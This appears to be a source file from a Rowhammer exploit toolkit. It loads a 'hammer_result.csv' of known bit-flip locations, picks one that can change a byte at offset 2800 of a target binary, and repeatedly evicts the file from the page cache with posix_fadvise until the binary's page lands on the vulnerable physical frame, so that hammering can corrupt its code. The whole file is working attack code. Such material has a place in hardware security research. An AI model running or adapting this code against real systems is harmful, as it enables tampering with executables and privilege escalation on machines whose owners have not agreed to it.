#include "libhammer.h"

using namespace std;

uint64_t current_pa, step = 0;

uint64_t get_binary_pa_offset(const string &path, uint64_t offset)
{
    int fd;
    unsigned sz;
    struct stat st;
    void *image;
    uint64_t ret;

    ASSERT(-1 != (fd = open(path.c_str(), O_RDONLY)) );
    fstat(fd, &st);
    sz = st.st_size;

    ASSERT(0 != (image = mmap(0, sz, PROT_READ, MAP_PRIVATE, fd, 0)) );
    mlock(image, sz);
    ret = v2p(image+offset);

    munlock(image, sz);
    close(fd);
    munmap(image, sz);
    return ret;
}

// use fadvise to do waylaying!
void relocate_fadvise(const string& path)
{
    int fbin;
    struct stat st;

    ASSERT(-1 != (fbin = open(path.c_str(), O_RDONLY)) );
    fstat(fbin, &st);
    ASSERT(0 == posix_fadvise(fbin, 0, st.st_size, POSIX_FADV_DONTNEED));
    close(fbin);
}

int main(void)
{
    BinaryInfo target;

    target.path = "./target";
    target.flip_to = 0;
    target.offset = 2800;
    target.orig = 0x5f;
    target.target = 0x5b;

    // 1. find template position to put binary file in
    load_hammer_result("hammer_result.csv");
    vector<HammerResult> tmpl = find_template(target);
    map<uint64_t, HammerResult> paset;

    if (tmpl.size() > 0)
    {
        // 2. waylaying
        uint64_t waylaying_offset = target.offset & ~0xfffull;
        for (HammerResult r : tmpl)
            paset[r.base] = r;

        // file+waylaying_offset should be on pa=HammerResult.base
        current_pa = get_binary_pa_offset(target.path, waylaying_offset);
        while (paset.count(current_pa) == 0)
        {
            ++step;
            cout << "+ step " << dec << step << ": " << hex << current_pa << endl;
            relocate_fadvise(target.path);
            current_pa = get_binary_pa_offset(target.path, waylaying_offset);
        }
    }
    cout << "* target pa=0x" << hex << current_pa << ", hammer template=";
    paset[current_pa].print();
    return 0;
}
